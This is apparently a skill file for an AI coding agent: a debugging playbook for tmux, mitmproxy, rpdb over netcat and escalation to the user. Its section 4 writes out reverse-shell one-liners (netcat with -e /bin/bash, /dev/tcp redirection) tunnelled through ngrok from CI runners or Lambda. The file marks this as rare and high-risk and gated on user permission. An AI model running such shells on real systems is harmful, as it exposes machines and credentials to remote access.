---
name: debugging
description: Repeatable debugging patterns (tmux panes, mitmproxy, rpdb, convo, etc.) for investigating tricky issues.
---

# Debugging Playbook

Use this skill when a bug requires deeper instrumentation than simple logging. It packages a few battle-tested techniques so you can reach for the right tool quickly.

## Core Principles
1. **Isolate the repro** – capture the exact command / script / URL that fails.
2. **Instrument in tmux** – every technique below assumes you are working in a tmux session (see the tmux skill for setup, pane management, and captures).
3. **Collect evidence before guessing** – save logs, capture pane output, and note timestamps so you can correlate later.

## Techniques

### 1. HTTP(S) Traffic Inspection via mitmproxy
Use when a script makes HTTP(S) calls and returns unexpected data (wrong payload, auth failure, redirects, etc.).

Steps:
1. Open a new tmux pane dedicated to mitmproxy:
   ```bash
   tmux split-window -h
   mitmproxy -p 6767
   ```
2. In the original pane, route traffic through the proxy. Examples:
   ```bash
   curl -x http://127.0.0.1:6767 https://example.com/api
   # Python requests
   HTTPS_PROXY=http://127.0.0.1:6767 python script.py
   ```
3. Watch flows in mitmproxy. Use `Enter` to inspect requests, `Tab` to switch between request/response, `e` → `b` to export bodies (as documented in the tmux skill learned lessons).
4. Quit mitmproxy with `q` then `y` when done. Capture output using `tmux capture-pane` if you need to cite it.

### 2. Python Async / Remote Debugging with rpdb
Use when async code behaves inconsistently and you need an interactive breakpoint.

Steps:
1. Insert a breakpoint:
   ```python
   import rpdb; rpdb.set_trace()
   ```
   This opens a debugger on `localhost:4444`.
2. In tmux, open a new pane and connect with netcat:
   ```bash
   nc 127.0.0.1 4444
   ```
3. Interact with the debugger (`c`, `n`, `p variable`, etc.). Log commands in `progress.md` or the tmux pane capture so you can replay them later.
4. When finished, type `c` (continue) or `q` to exit.

### 3. Conversational Pane Assistance (`convo`)
`convo` reads the current pane buffer and sends it to an LLM, so it can summarize commands, interpret tracebacks, or explain build errors.

Common prompts:
```bash
convo "summarize the command I just ran"
convo "explain the Python traceback above"
convo "suggest next steps based on the npm error"
```
Use this when you need a quick narrative of what just happened or a second opinion on logs before reporting back to the user. Paste the answer into `progress.md` or your final summary if helpful.

### 4. Reverse Shell / Remote Debugging over ngrok (Rare, High-Risk)
Only consider this when there’s no safer option to reach a remote environment (Lambda, GitHub Actions runner, etc.). **Do not use it routinely.** Before proceeding, explicitly ask the user for permission and explain the risks (exposing shells over the internet, potential credential leaks).

Steps:
1. In tmux, open a pane for the listener:
   ```bash
   ngrok tcp 4444
   # or ssh -R / socat if ngrok isn’t available
   ```
   Note the forwarded host/port (e.g., `4.tcp.ngrok.io:12345`).
2. On the remote environment, run a reverse shell pointing to that host/port. Example using netcat:
   ```bash
   nc 4.tcp.ngrok.io 12345 -e /bin/bash
   ```
   If `-e` isn’t available, use `/bin/sh -i >& /dev/tcp/<host>/<port> 0>&1` or a Python socket snippet.
3. Once connected, run commands or attach rpdb/pdb sessions as needed. Keep meticulous logs of what you touch and mask secrets.
4. When done, exit the shell, terminate ngrok, scrub any temp scripts/credentials, and document that the session was torn down.

### 5. General Troubleshooting Template
- **Describe the state**: “After deploying, /health returns 500 with XYZ.”
- **Capture evidence**: logs (`tail -n 200 log.txt`), screenshots, mitmproxy exports, rpdb session notes.
- **Form hypotheses**: jot them in `findings.md` if you’re using planning-with-files.
- **Test systematically**: change one variable at a time, record results.
- **Summarize**: include repro steps, root cause, and fix in your final write-up.

### 6. Escalate to the User When Stuck
If you’ve been spinning for a while, pause and brief the user rather than guessing endlessly. Provide:
- Repro steps and current status (include commands, environments, branches).
- Techniques already tried (e.g., mitmproxy captures, rpdb breakpoints, convo summaries).
- Hypotheses tested and their outcomes.
- Open questions or blockers where their domain knowledge may help.
This makes it easier for the human to unblock you or suggest a new angle.

## Tips
- Whenever you introduce a tool (mitmproxy, rpdb, convo, ngrok reverse shells), mention it explicitly to the user so they understand the extra instrumentation.
- Clean up: stop proxies, close rpdb sessions, kill tmux panes/windows you no longer need, and tear down reverse shells.
- Save artifacts under `/tmp` (e.g., `/tmp/mitm-flow.txt`, `/tmp/rpdb-session.log`) when the investigation spans multiple steps.

## Learned Lessons
Add scenario-specific debugging tricks (e.g., other proxy ports, language-specific debuggers) here as they come up.
